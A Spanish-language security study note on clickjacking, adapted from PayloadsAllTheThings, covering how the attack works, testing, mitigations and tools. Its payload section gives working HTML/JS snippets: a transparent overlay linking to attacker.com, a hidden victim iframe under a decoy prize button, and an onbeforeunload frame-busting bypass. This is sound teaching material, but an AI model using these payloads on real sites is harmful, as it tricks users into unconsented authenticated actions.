---
tags:
  - seguridad-web
  - owasp
  - clickjacking
aliases:
  - UI Redressing
---

# Clickjacking

**Un sitio malicioso superpone (normalmente en un iframe transparente) una página legítima para engañar al usuario y que haga clic en acciones que no percibe.** Así puede ejecutar acciones autenticadas sin su consentimiento (eliminar cuenta, transferir, dar like, etc.).

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El atacante embebe el sitio víctima en un `<iframe>` y lo hace invisible (`opacity: 0`) o de tamaño cero, posicionándolo sobre elementos señuelo. El usuario cree interactuar con la interfaz visible, pero sus clics caen sobre el iframe oculto.

Variantes:
- **UI Redressing**: capa transparente sobre la página legítima.
- **Invisible Frames**: iframe oculto (`height:0; width:0; border:none`).
- **Button/Form Hijacking**: botón visible que dispara un formulario oculto.

## Detección y pruebas
- Comprobar si la página se deja embeber: cargarla dentro de un `<iframe>` propio.
- Verificar ausencia/debilidad de `X-Frame-Options` y de la directiva CSP `frame-ancestors`.
- Revisar si el frame busting depende solo de JavaScript (evadible).

## Explotación / payloads
Overlay transparente sobre un enlace malicioso:
```html
<div style="opacity:0; position:absolute; top:0; left:0; height:100%; width:100%;">
  <a href="https://attacker.com/malicious">Click me</a>
</div>
```

Iframe víctima invisible con señuelo encima:
```html
<div style="position:absolute; opacity:0;">
  <iframe src="https://legitimate-site.example.com/login" width="500" height="500"></iframe>
</div>
<button>Gana un premio</button>
```

Evasión de frame busting con `onbeforeunload` (cancela la navegación de salida):
```html
<script>
  var prevent_bust = 0;
  window.onbeforeunload = () => { prevent_bust++; };
  setInterval(() => {
    if (prevent_bust > 0) { prevent_bust -= 2; window.top.location = "http://attacker.com/204"; }
  }, 1); // 204 = respuesta "HTTP/1.1 204 No Content"
</script>
<iframe src="https://target.example.com"></iframe>
```

## Mitigación
- Cabecera `X-Frame-Options: DENY` o `SAMEORIGIN`.
- CSP con `frame-ancestors 'self'` (sustituto moderno y más flexible que XFO):
  ```html
  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
  ```
- No depender solo de frame busting JS (se evade con `sandbox`, filtros XSS u `onbeforeunload`).
- Usar atributo `sandbox` y confirmaciones explícitas en acciones críticas.

## Herramientas
- Burp Suite, ZAP (detección de framing).
- clickjack (generador de PoC).

---
🔗 Relacionado: [[CSRF (Cross-Site Request Forgery)]] · [[Tabnabbing]] · [[XS-Leaks]]
📚 Fuente: [PayloadsAllTheThings — Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking) (MIT, © Swissky)
